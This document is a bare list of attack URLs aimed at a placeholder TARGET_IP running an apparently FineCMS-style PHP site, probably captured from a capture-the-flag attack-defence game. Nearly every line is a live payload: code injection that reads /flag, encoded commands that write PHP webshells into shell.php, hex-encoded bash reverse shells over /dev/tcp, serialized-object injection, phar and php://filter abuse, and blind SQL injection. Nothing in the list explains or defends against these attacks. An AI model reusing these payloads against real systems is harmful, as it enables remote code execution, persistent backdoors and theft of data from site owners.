+http://TARGET_IP/index.php?controllers/admin/Block.php&admin=aHR0cCUzQSUyZiUyZjEyNy4wLjAuMSUyZmluZGV4LnBocCUzRmZpbGUlM0RodHRwJTNBJTJmJTJmMTI3LjAuMC4xJTJmJTI2cGF0aCUzRCUyNTNDJTI1M0ZwaHAlMjUyMEBldmFsJTI1MjglMjUyNF9QT1NUJTI1NUIlMjUyN2MlMjUyNyUyNTVEJTI1MjklMjUzQiUyNTNGJTI1M0UmcGF0aD0uL2ZsYWc=
+http://TARGET_IP/index.php?controllers/admin/Block.php&site=highlight_file(%22/flag%22);
+http://TARGET_IP/index.php?dl.php?mod=modify&filename=b5523c7a0e8d11eaa53bd3c947940d9f.php
+http://TARGET_IP/index.php?b2b_sysdata.php?mod=query&filename=b5523c7b0e8d11eaa53bd3c947940d9f.php
+http://TARGET_IP/index.php?admin_db_backup.php&action=RestoreData
+http://TARGET_IP/index.php?controllers/member/Api.php&limit=echo%20file_get_contents(%22/flag%22);
+http://TARGET_IP/index.php?controllers/admin/Block.php&admin=c3lzdGVtKCJlY2hvIDw/cGhwICR7KCIjIl4ifCIpLigiIyJeInwiKX09KCIhIl4iYCIpLigiKCAiXiJ7IikuKCIoIl4iWyIpLigifiJeIjsiKS4oInwiXiIuIikuKCIqIl4ifiIpOyR7KCIjIl4ifCIpLigiIyJeInwiKX0oKCItIl4iSCIpLiAoIl0iXiIrIikuICgiWyJeIjoiKS4gKCIsIl4iQCIpLiAoIn0iXiJVIikuICgiZSJeIkEiKS4gKCIoIl4idyIpLigiaiJeIjoiKS4gKCJpIl4iJiIpLiAoIiMiXiJwIikuICgiPiJeImoiKS4gKCIhIl4ieiIpLiAoInQiXiJnIikuICgiZSJeInMiKS4gKCJfIl4ibyIpLiAoIj8iXiJiIikuICgiXSJeInQiKSk7Pz4gPiAvLmMwbmZpZy5waHAiKTs=
+http://TARGET_IP/index.php?controllers/member/Api.php&file=highlight_file(%22/flag%22);
+http://TARGET_IP/index.php?controllers/member/Api.php&site=$%7Beval(substr(hex2bin(667075747328666f70656e28227368656c6c2e706870222c227722292c223c3f706870204061737365727428245f504f53545b68616861686168615d293b3f3e),1,66))%7D
+http://TARGET_IP/index.php?controllers/admin/Content.php&total=aHR0cCUzQSUyZiUyZjEyNy4wLjAuMSUyZmluZGV4LnBocCUzRmZpbGUlM0RodHRwJTNBJTJmJTJmMTI3LjAuMC4xJTJmJTI2cGF0aCUzRCUyNTNDJTI1M0ZwaHAlMjUyMEBldmFsJTI1MjglMjUyNF9QT1NUJTI1NUIlMjUyN2MlMjUyNyUyNTVEJTI1MjklMjUzQiUyNTNGJTI1M0UmcGF0aD0uL2ZsYWc=
+http://TARGET_IP/index.php?controllers/admin/Urlrule.php&admin=cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7
+http://TARGET_IP/index.php?api/ucsso/client.php&__times__=ZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKTs=
+http://TARGET_IP/index.php?controllers/member/Api.php&limit=phar://Up10aDs/y9c8v9ow3s6ans5o8oy5u3qnsdnckQVJFIFlPVSBLSURESU5HIE1Ffn4=%0Aeva.png/hahahaha
+http://TARGET_IP/index.php?models/Tag_model.php&order=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?controllers/admin/Block.php&admin=%7CO:6:%22secret%22:1:%7Bs:4:%22gogo%22;s:55:%22highlight_file(%22/flag%22);%22;%7D
+http://TARGET_IP/index.php?models/Member_model.php&groupid=cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&id=fXtlbmQgaWZ9e2lmOjEpZXZhbCgkX1BPU1RbY21kXSk7aWYoMX17ZW5kIGlmfSZjbWQ9ZnB1dHMoZm9wZW4oInNoZWxsLnBocCIsInciKSwiPD9waHAgXCRlPWNocignOTcnKS4nc3NlcnQnO1wkZShcJF9QT1NUW2FzYXNhXSk7Pz4iKTs=
+http://TARGET_IP/index.php?rmod=uploadfile&filename=c108dcb80e8d11eaa5d8d3c947940d9f.php
+http://TARGET_IP/index.php?dsite=dmFyX2R1bXAoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw==
+http://TARGET_IP/index.php?filename=c208e4aa0e8d11eaa5e9d3c947940d9f.php
+http://TARGET_IP/index.php?rtotal=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?r=print_r(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?controllers/member/Api.php&title=%7CO:6:%22secret%22:1:%7Bs:4:%22gogo%22;s:55:%22highlight_file(%22/flag%22);%22;%7D
+http://TARGET_IP/index.php?mod=modify&filename=c208e4ab0e8d11eaa5e9d3c947940d9f.php
+http://TARGET_IP/index.php?controllers/admin/Content.php&total=highlight_file(%22/flag%22);
+http://TARGET_IP/index.php?api/ucsso/helper.php?callback=%7D%7Bend%20if%7D%7Bif:1)eval($_POST[cmd]);if(1%7D%7Bend%20if%7D&cmd=fputs(fopen(%22shell.php%22,%22w%22),%22%3C?php%20%5C$e=chr('97').'ssert';%5C$e(%5C$_POST[asasa]);&%3E%22);
+http://TARGET_IP/index.php?controllers/admin/Weixin.php&admin=cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7
+http://TARGET_IP/index.php?api/ucsso/helper.php&callback=JHtldmFsKHN1YnN0cihoZXgyYmluKDY2NzA3NTc0NzMyODY2NmY3MDY1NmUyODIyNzM2ODY1NmM2YzJlNzA2ODcwMjIyYzIyNzcyMjI5MmMyMjNjM2Y3MDY4NzAyMDQwNjE3MzczNjU3Mjc0MjgyNDVmNTA0ZjUzNTQ1YjY4NjE2ODYxNjg2MTY4NjE1ZDI5M2IzZjNlKSwxLDY2KSl9
+http://TARGET_IP/index.php?finecms/Init.php&m=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?models/Form_model.php&order=cGhhcjovL1VwMTBhRHMveTljOHY5b3czczZhbnM1bzhveTV1M3Fuc2RuY2tRVkpGSUZsUFZTQkxTVVJFU1U1SElFMUZmbjQ9CmV2YS5wbmcvaGFoYWhhaGE=
+http://TARGET_IP/index.php?models/Tag_model.php&order=var_dump(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?Neeao_SqlIn.php?mod=query&filename=c49ede9a0e8d11eaa602d3c947940d9f.php
+http://TARGET_IP/index.php?controllers/Api.php&http_referer=$%7Bsystem(hex2bin(ff0a2f62696e2f62617368202d6320277368202d69203e26202f6465762f7463702f3132372e302e302e312f3434343420303e263127))%7D
+http://TARGET_IP/index.php?finecms/Init.php&c=aHR0cCUzQSUyZiUyZjEyNy4wLjAuMSUyZmluZGV4LnBocCUzRmZpbGUlM0RodHRwJTNBJTJmJTJmMTI3LjAuMC4xJTJmJTI2cGF0aCUzRCUyNTNDJTI1M0ZwaHAlMjUyMEBldmFsJTI1MjglMjUyNF9QT1NUJTI1NUIlMjUyN2MlMjUyNyUyNTVEJTI1MjklMjUzQiUyNTNGJTI1M0UmcGF0aD0uL2ZsYWc=
+http://TARGET_IP/index.php?controllers/admin/Form.php&site=JHtzeXN0ZW0oaGV4MmJpbihmZjBhMmY2MjY5NmUyZjYyNjE3MzY4MjAyZDYzMjAyNzczNjgyMDJkNjkyMDNlMjYyMDJmNjQ2NTc2MmY3NDYzNzAyZjMxMzIzNzJlMzAyZTMwMmUzMTJmMzQzNDM0MzQyMDMwM2UyNjMxMjcpKX0=
+http://TARGET_IP/index.php?controllers/Search.php&page=%7CO:6:%22secret%22:1:%7Bs:4:%22gogo%22;s:55:%22highlight_file(%22/flag%22);%22;%7D
+http://TARGET_IP/index.php?api/ucsso/api.php&code=fXtlbmQgaWZ9e2lmOjEpZXZhbCgkX1BPU1RbY21kXSk7aWYoMX17ZW5kIGlmfSZjbWQ9ZnB1dHMoZm9wZW4oInNoZWxsLnBocCIsInciKSwiPD9waHAgXCRlPWNocignOTcnKS4nc3NlcnQnO1wkZShcJF9QT1NUW2FzYXNhXSk7Pz4iKTs=
+http://TARGET_IP/index.php?controllers/member/Api.php&file=%3Cinput%20type=%22text%22%20class=%22input-text%22%20name=%22data[uc_ip,x);a]%3E]%22%20id=%22uc_ip%22%20value=%22;eval($_POST[1]);%20%22%3E
+http://TARGET_IP/index.php?models/Tag_model.php&order=highlight_file(%22/flag%22);
+http://TARGET_IP/index.php?controllers/admin/Content.php&caitd=MT0oc3Vic3RyaW5nKChzZWxlY3QKMHg2Ngpmcm9tCmZsYWcKd2hlcmUKYmluYXJ5KC9mbGFnKTwweDJlMmYpZnJvbQoxKSk=
+http://TARGET_IP/index.php?models/Member_model.php&order=fE86NToiZmxhZzIiOjE6e3M6NDoiZ29nbyI7czo1NToic2hvd19zb3VyY2UoIi9mbGFnIik7Ijt9
+http://TARGET_IP/index.php?controllers/member/Api.php&limit=%7CO:6:%22secret%22:1:%7Bs:4:%22gogo%22;s:55:%22highlight_file(%22/flag%22);%22;%7D
+http://TARGET_IP/index.php?helpers/function_helper.php&return=cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7
+http://TARGET_IP/index.php?core/M_Controller.php&jsonp=ZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKTs=
+http://TARGET_IP/index.php?helpers/function_helper.php&cache=aHR0cCUzQSUyZiUyZjEyNy4wLjAuMSUyZmluZGV4LnBocCUzRmZpbGUlM0RodHRwJTNBJTJmJTJmMTI3LjAuMC4xJTJmJTI2cGF0aCUzRCUyNTNDJTI1M0ZwaHAlMjUyMEBldmFsJTI1MjglMjUyNF9QT1NUJTI1NUIlMjUyN2MlMjUyNyUyNTVEJTI1MjklMjUzQiUyNTNGJTI1M0UmcGF0aD0uL2ZsYWc=
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&admin=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?core/M_Controller.php&page=dmFyX2R1bXAoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw==
+http://TARGET_IP/index.php?commentedit.htm?mod=uploadfile&filename=d01909760e8d11eaa6cad3c947940d9f.php
+http://TARGET_IP/index.php?api/ueditor/php/action_upload.php&action=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?admin_admin.php?mod=view&filename=d01909770e8d11eaa6cad3c947940d9f.php
+http://TARGET_IP/index.php?core/M_Controller.php&return=JHtzeXN0ZW0oaGV4MmJpbihmZjBhMmY2MjY5NmUyZjYyNjE3MzY4MjAyZDYzMjAyNzczNjgyMDJkNjkyMDNlMjYyMDJmNjQ2NTc2MmY3NDYzNzAyZjMxMzIzNzJlMzAyZTMwMmUzMTJmMzQzNDM0MzQyMDMwM2UyNjMxMjcpKX0=
+http://TARGET_IP/index.php?api/ucsso/api.php&action=var_dump(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?api/ucsso/api.php&time=var_dump(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&lid=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?helpers/function_helper.php?cache=system(%22echo%20%3C&php%20$%7B(%22
+http://TARGET_IP/index.php?controllers/admin/Form.php&site=fXtlbmQgaWZ9e2lmOjEpZXZhbCgkX1BPU1RbY21kXSk7aWYoMX17ZW5kIGlmfSZjbWQ9ZnB1dHMoZm9wZW4oInNoZWxsLnBocCIsInciKSwiPD9waHAgXCRlPWNocignOTcnKS4nc3NlcnQnO1wkZShcJF9QT1NUW2FzYXNhXSk7Pz4iKTs=
+http://TARGET_IP/index.php?upproduce.php?mod=query&filename=d3c784f80e8d11eaa6fad3c947940d9f.php
+http://TARGET_IP/index.php?controllers/member/Api.php&fname=fE86NToiZmxhZzIiOjE6e3M6NDoiZ29nbyI7czo1NToic2hvd19zb3VyY2UoIi9mbGFnIik7Ijt9
+http://TARGET_IP/index.php?libraries/Template.php&page=print_r(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?helpers/function_helper.php&page=aGlnaGxpZ2h0X2ZpbGUoIi9mbGFnIik7
+http://TARGET_IP/index.php?controllers/admin/Site.php&id=JHtldmFsKHN1YnN0cihoZXgyYmluKDY2NzA3NTc0NzMyODY2NmY3MDY1NmUyODIyNzM2ODY1NmM2YzJlNzA2ODcwMjIyYzIyNzcyMjI5MmMyMjNjM2Y3MDY4NzAyMDQwNjE3MzczNjU3Mjc0MjgyNDVmNTA0ZjUzNTQ1YjY4NjE2ODYxNjg2MTY4NjE1ZDI5M2IzZjNlKSwxLDY2KSl9
+http://TARGET_IP/index.php?api/ucsso/api.php&code=echo%20file_get_contents(%22/flag%22);
+http://TARGET_IP/index.php?libraries/Template.php&page=dmFyX2R1bXAoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw==
+http://TARGET_IP/index.php?api/ucsso/api.php&code=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?controllers/admin/Block.php&admin=$%7Bsystem(hex2bin(ff0a2f62696e2f62617368202d6320277368202d69203e26202f6465762f7463702f3132372e302e302e312f3434343420303e263127))%7D
+http://TARGET_IP/index.php?helpers/function_helper.php&return=var_dump(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?core/M_Controller.php&jsonp=aGlnaGxpZ2h0X2ZpbGUoIi9mbGFnIik7
+http://TARGET_IP/index.php?models/Member_model.php&groupid=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?controllers/admin/Tag.php&pid=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?core/M_Table.php&page=cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7
+http://TARGET_IP/index.php?controllers/member/Login.php&debug=PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJpbnB1dC10ZXh0IiBuYW1lPSJkYXRhW3VjX2lwLHgpO2FdPl0iIGlkPSJ1Y19pcCIgdmFsdWU9IjtldmFsKCRfUE9TVFsxXSk7ICI+
+http://TARGET_IP/index.php?file=aGlnaGxpZ2h0X2ZpbGUoIi9mbGFnIik7
+http://TARGET_IP/index.php?api/ucsso/helper.php&callback=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?controllers/Api.php&page=fE86NToiZmxhZzIiOjE6e3M6NDoiZ29nbyI7czo1NToic2hvd19zb3VyY2UoIi9mbGFnIik7Ijt9
+http://TARGET_IP/index.php?index.html?mod=view&filename=de0fc4020e8d11eaa7a6d3c947940d9f.php
+http://TARGET_IP/index.php?helpers/function_helper.php&order=cGhhcjovL1VwMTBhRHMveTljOHY5b3czczZhbnM1bzhveTV1M3Fuc2RuY2tRVkpGSUZsUFZTQkxTVVJFU1U1SElFMUZmbjQ9CmV2YS5wbmcvaGFoYWhhaGE=
+http://TARGET_IP/index.php?wwwroot.zip?mod=modify&filename=dede50060e8d11eaa7b5d3c947940d9f.php
+http://TARGET_IP/index.php?controllers/member/Api.php&site=fE86NToiZmxhZzIiOjE6e3M6NDoiZ29nbyI7czo1NToic2hvd19zb3VyY2UoIi9mbGFnIik7Ijt9
+http://TARGET_IP/index.php?controllers/admin/Site.php&admin=http%3A%2f%2f127.0.0.1%2findex.php%3Ffile%3Dhttp%3A%2f%2f127.0.0.1%2f%26path%3D%253C%253Fphp%2520@eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%253F%253E&path=./flag
+http://TARGET_IP/index.php?mod=query&filename=dede50070e8d11eaa7b5d3c947940d9f.php
+http://TARGET_IP/index.php?core/M_Controller.php&page=$%7Bsystem(hex2bin(ff0a2f62696e2f62617368202d6320277368202d69203e26202f6465762f7463702f3132372e302e302e312f3434343420303e263127))%7D
+http://TARGET_IP/index.php?core/M_Controller.php&page=JHtldmFsKHN1YnN0cihoZXgyYmluKDY2NzA3NTc0NzMyODY2NmY3MDY1NmUyODIyNzM2ODY1NmM2YzJlNzA2ODcwMjIyYzIyNzcyMjI5MmMyMjNjM2Y3MDY4NzAyMDQwNjE3MzczNjU3Mjc0MjgyNDVmNTA0ZjUzNTQ1YjY4NjE2ODYxNjg2MTY4NjE1ZDI5M2IzZjNlKSwxLDY2KSl9
+http://TARGET_IP/index.php?core/M_Table.php&order=aGlnaGxpZ2h0X2ZpbGUoIi9mbGFnIik7
+http://TARGET_IP/index.php?controllers/admin/Fcontent.php&page=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?api/ucsso/api.php&code=c3lzdGVtKCJlY2hvIDw/cGhwICR7KCIjIl4ifCIpLigiIyJeInwiKX09KCIhIl4iYCIpLigiKCAiXiJ7IikuKCIoIl4iWyIpLigifiJeIjsiKS4oInwiXiIuIikuKCIqIl4ifiIpOyR7KCIjIl4ifCIpLigiIyJeInwiKX0oKCItIl4iSCIpLiAoIl0iXiIrIikuICgiWyJeIjoiKS4gKCIsIl4iQCIpLiAoIn0iXiJVIikuICgiZSJeIkEiKS4gKCIoIl4idyIpLigiaiJeIjoiKS4gKCJpIl4iJiIpLiAoIiMiXiJwIikuICgiPiJeImoiKS4gKCIhIl4ieiIpLiAoInQiXiJnIikuICgiZSJeInMiKS4gKCJfIl4ibyIpLiAoIj8iXiJiIikuICgiXSJeInQiKSk7Pz4gPiAvLmMwbmZpZy5waHAiKTs=
+http://TARGET_IP/index.php?controllers/admin/Content.php&total=JHtldmFsKHN1YnN0cihoZXgyYmluKDY2NzA3NTc0NzMyODY2NmY3MDY1NmUyODIyNzM2ODY1NmM2YzJlNzA2ODcwMjIyYzIyNzcyMjI5MmMyMjNjM2Y3MDY4NzAyMDQwNjE3MzczNjU3Mjc0MjgyNDVmNTA0ZjUzNTQ1YjY4NjE2ODYxNjg2MTY4NjE1ZDI5M2IzZjNlKSwxLDY2KSl9
+http://TARGET_IP/index.php?Manage_backup.php&action=Backup
+http://TARGET_IP/index.php?api/ucsso/client.php&__times__=$%7Beval(substr(hex2bin(ff6576616c28245f524551554553545b635d293b),1,19))%7D
+http://TARGET_IP/index.php?finecms/Init.php&c=MT0oc3Vic3RyaW5nKChzZWxlY3QKMHg2Ngpmcm9tCmZsYWcKd2hlcmUKYmluYXJ5KC9mbGFnKTwweDJlMmYpZnJvbQoxKSk=
+http://TARGET_IP/index.php?controllers/member/Login.php&debug=%7CO:5:%22flag2%22:1:%7Bs:4:%22gogo%22;s:55:%22show_source(%22/flag%22);%22;%7D
+http://TARGET_IP/index.php?api/ueditor/php/action_upload.php&action=print_r(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?helpers/function_helper.php&page=ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LEwyWnNZV2M9PSZmaWxlPXBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9aW5kZXgucGhw
+http://TARGET_IP/index.php?changepwd.php?mod=uploadfile&filename=e65ac62a0e8d11eaa82cd3c947940d9f.php
+http://TARGET_IP/index.php?controllers/admin/Content.php&caitd=ZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKTs=
+http://TARGET_IP/index.php?api/ueditor/php/controller.php?action=%7D%7Bend%20if%7D%7Bif:1)eval($_POST[cmd]);if(1%7D%7Bend%20if%7D&cmd=fputs(fopen(%22shell.php%22,%22w%22),%22%3C?php%20%5C$e=chr('97').'ssert';%5C$e(%5C$_POST[asasa]);&%3E%22);
+http://TARGET_IP/index.php?c=category&id=1
+http://TARGET_IP/index.php?c=form&mid=liuyan
+http://TARGET_IP/index.php?s=member&c=register&m=index 
+http://TARGET_IP/index.php?s=member&c=login&m=index 
+http://TARGET_IP/index.php?s=member&c=account&m=upload&iajax=1 
+http://TARGET_IP/index.php?controllers/admin/Linkage.php&lid=MT0oc3Vic3RyaW5nKChzZWxlY3QKMHg2Ngpmcm9tCmZsYWcKd2hlcmUKYmluYXJ5KC9mbGFnKTwweDJlMmYpZnJvbQoxKSk=
+http://TARGET_IP/index.php?models/Tag_model.php&order=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?HX_LOGIN.php?mod=modify&filename=e858706c0e8d11eaa85fd3c947940d9f.php
+http://TARGET_IP/index.php?models/Member_model.php&groupid=highlight_file(%22/flag%22);
+http://TARGET_IP/index.php?tb.php?mod=query&filename=e858706d0e8d11eaa85fd3c947940d9f.php
+http://TARGET_IP/index.php?core/M_Controller.php&page=1=(substring((select%0A0x66%0Afrom%0Aflag%0Awhere%0Abinary(/flag)%3C0x2e2f)from%0A1))
+http://TARGET_IP/index.php?controllers/admin/Form.php&site=MT0oc3Vic3RyaW5nKChzZWxlY3QKMHg2Ngpmcm9tCmZsYWcKd2hlcmUKYmluYXJ5KC9mbGFnKTwweDJlMmYpZnJvbQoxKSk=
+http://TARGET_IP/index.php?admin_db_backup.php&action=BackupData
+http://TARGET_IP/index.php?controllers/Search.php&page=aHR0cCUzQSUyZiUyZjEyNy4wLjAuMSUyZmluZGV4LnBocCUzRmZpbGUlM0RodHRwJTNBJTJmJTJmMTI3LjAuMC4xJTJmJTI2cGF0aCUzRCUyNTNDJTI1M0ZwaHAlMjUyMEBldmFsJTI1MjglMjUyNF9QT1NUJTI1NUIlMjUyN2MlMjUyNyUyNTVEJTI1MjklMjUzQiUyNTNGJTI1M0UmcGF0aD0uL2ZsYWc=
+http://TARGET_IP/index.php?finecms/Init.php&c=$%7Beval(substr(hex2bin(ff6576616c28245f524551554553545b635d293b),1,19))%7D
+http://TARGET_IP/index.php?finecms/Init.php&c=cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7
+http://TARGET_IP/index.php?core/M_Controller.php&jsonp=http%3A%2f%2f127.0.0.1%2findex.php%3Ffile%3Dhttp%3A%2f%2f127.0.0.1%2f%26path%3D%253C%253Fphp%2520@eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%253F%253E&path=./flag
+http://TARGET_IP/index.php?controllers/admin/Form.php&admin=JHtzeXN0ZW0oaGV4MmJpbihmZjBhMmY2MjY5NmUyZjYyNjE3MzY4MjAyZDYzMjAyNzczNjgyMDJkNjkyMDNlMjYyMDJmNjQ2NTc2MmY3NDYzNzAyZjMxMzIzNzJlMzAyZTMwMmUzMTJmMzQzNDM0MzQyMDMwM2UyNjMxMjcpKX0=
+http://TARGET_IP/index.php?core/M_Controller.php&return=PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJpbnB1dC10ZXh0IiBuYW1lPSJkYXRhW3VjX2lwLHgpO2FdPl0iIGlkPSJ1Y19pcCIgdmFsdWU9IjtldmFsKCRfUE9TVFsxXSk7ICI+
+http://TARGET_IP/index.php?controllers/admin/Content.php&caitd=c3lzdGVtKCJjYXQgL2ZsYWciKTs=
+http://TARGET_IP/index.php?models/Tag_model.php&order=dmFyX2R1bXAoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw==
+http://TARGET_IP/index.php?controllers/admin/Weixin.php&site=http%3A%2f%2f127.0.0.1%2findex.php%3Ffile%3Dhttp%3A%2f%2f127.0.0.1%2f%26path%3D%253C%253Fphp%2520@eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%253F%253E&path=./flag
+http://TARGET_IP/index.php?controllers/admin/Site.php&admin=PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJpbnB1dC10ZXh0IiBuYW1lPSJkYXRhW3VjX2lwLHgpO2FdPl0iIGlkPSJ1Y19pcCIgdmFsdWU9IjtldmFsKCRfUE9TVFsxXSk7ICI+
+http://TARGET_IP/index.php?models/Tag_model.php&order=c3lzdGVtKCJlY2hvIDw/cGhwICR7KCIjIl4ifCIpLigiIyJeInwiKX09KCIhIl4iYCIpLigiKCAiXiJ7IikuKCIoIl4iWyIpLigifiJeIjsiKS4oInwiXiIuIikuKCIqIl4ifiIpOyR7KCIjIl4ifCIpLigiIyJeInwiKX0oKCItIl4iSCIpLiAoIl0iXiIrIikuICgiWyJeIjoiKS4gKCIsIl4iQCIpLiAoIn0iXiJVIikuICgiZSJeIkEiKS4gKCIoIl4idyIpLigiaiJeIjoiKS4gKCJpIl4iJiIpLiAoIiMiXiJwIikuICgiPiJeImoiKS4gKCIhIl4ieiIpLiAoInQiXiJnIikuICgiZSJeInMiKS4gKCJfIl4ibyIpLiAoIj8iXiJiIikuICgiXSJeInQiKSk7Pz4gPiAvLmMwbmZpZy5waHAiKTs=
+http://TARGET_IP/index.php?helpers/function_helper.php&return=$%7Beval(substr(hex2bin(667075747328666f70656e28227368656c6c2e706870222c227722292c223c3f706870204061737365727428245f504f53545b68616861686168615d293b3f3e),1,66))%7D
+http://TARGET_IP/index.php?controllers/admin/Block.php&admin=print_r(file_get_contents(%22/flag%22));
+http://TARGET_IP/index.php?controllers/admin/Weixin.php&site=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?api/ucsso/api.php&time=fE86NToiZmxhZzIiOjE6e3M6NDoiZ29nbyI7czo1NToic2hvd19zb3VyY2UoIi9mbGFnIik7Ijt9
+http://TARGET_IP/index.php?gldl.php?mod=uploadfile&filename=f079f1300e8d11eaa8c8d3c947940d9f.php
+http://TARGET_IP/index.php?core/M_Table.php&page=system(%22cat%20/flag%22);
+http://TARGET_IP/index.php?controllers/member/Api.php&site=$%7Bsystem(hex2bin(ff0a2f62696e2f62617368202d6320277368202d69203e26202f6465762f7463702f3132372e302e302e312f3434343420303e263127))%7D
+http://TARGET_IP/index.php?controllers/admin/Fcontent.php&total=dmFyX2R1bXAoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw==
+http://TARGET_IP/index.php?admin_admin.php?mod=view&filename=f079f1310e8d11eaa8c8d3c947940d9f.php
+http://TARGET_IP/index.php?controllers/admin/Form.php&site=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?logout.htm?mod=modify&filename=f1d3e45a0e8d11eaa8f4d3c947940d9f.php
+http://TARGET_IP/index.php?controllers/Search.php&page=ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LEwyWnNZV2M9PSZmaWxlPXBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9aW5kZXgucGhw
+http://TARGET_IP/index.php?finecms/Init.php&s=c3lzdGVtKCJlY2hvIDw/cGhwICR7KCIjIl4ifCIpLigiIyJeInwiKX09KCIhIl4iYCIpLigiKCAiXiJ7IikuKCIoIl4iWyIpLigifiJeIjsiKS4oInwiXiIuIikuKCIqIl4ifiIpOyR7KCIjIl4ifCIpLigiIyJeInwiKX0oKCItIl4iSCIpLiAoIl0iXiIrIikuICgiWyJeIjoiKS4gKCIsIl4iQCIpLiAoIn0iXiJVIikuICgiZSJeIkEiKS4gKCIoIl4idyIpLigiaiJeIjoiKS4gKCJpIl4iJiIpLiAoIiMiXiJwIikuICgiPiJeImoiKS4gKCIhIl4ieiIpLiAoInQiXiJnIikuICgiZSJeInMiKS4gKCJfIl4ibyIpLiAoIj8iXiJiIikuICgiXSJeInQiKSk7Pz4gPiAvLmMwbmZpZy5waHAiKTs=
+http://TARGET_IP/index.php?controllers/admin/Site.php&admin=data://text/plain;base64,L2ZsYWc==&file=php://filter/convert.base64-encode/resource=index.php
+http://TARGET_IP/index.php?api/ueditor/php/controller.php&action=c3lzdGVtKCJjYXQgL2ZsYWciKTs=
+http://TARGET_IP/index.php?controllers/admin/Member.php&page=JHtldmFsKHN1YnN0cihoZXgyYmluKGZmNjU3NjYxNmMyODI0NWY1MjQ1NTE1NTQ1NTM1NDViNjM1ZDI5M2IpLDEsMTkpKX0=
+http://TARGET_IP/index.php?controllers/admin/Weixin.php&site=ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LEwyWnNZV2M9PSZmaWxlPXBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9aW5kZXgucGhw
+http://TARGET_IP/index.php?controllers/admin/Tag.php&admin=phar://Up10aDs/y9c8v9ow3s6ans5o8oy5u3qnsdnckQVJFIFlPVSBLSURESU5HIE1Ffn4=%0Aeva.png/hahahaha
+http://TARGET_IP/index.php?api/ucsso/helper.php&callback=$%7Beval(substr(hex2bin(667075747328666f70656e28227368656c6c2e706870222c227722292c223c3f706870204061737365727428245f504f53545b68616861686168615d293b3f3e),1,66))%7D
